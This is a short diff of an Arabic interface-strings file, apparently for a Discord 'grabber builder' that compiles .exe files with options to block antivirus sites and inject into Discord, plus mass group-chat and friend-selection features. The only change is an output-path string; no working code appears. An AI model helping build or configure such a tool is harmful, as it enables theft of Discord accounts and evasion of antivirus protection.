@@ -253,7 +253,7 @@ BlockAvSites (ن/ي)
 DiscordInjection (ن/ي)
 أيقونة الملف
 إنشاء {name}.exe، سيستغرق ذلك بضع ثوان. شكرًا لصبرك!
-الملف في 'output/grabberbuilder/{name}.exe'
+الملف في {path}
 تم إنشاء محادثة جماعية
 تم تحديد السرعة ({response.json()['retry_after']} مللي ثانية)
 لا يوجد ما يكفي من الأصدقاء المتاحين للاختيار العشوائي
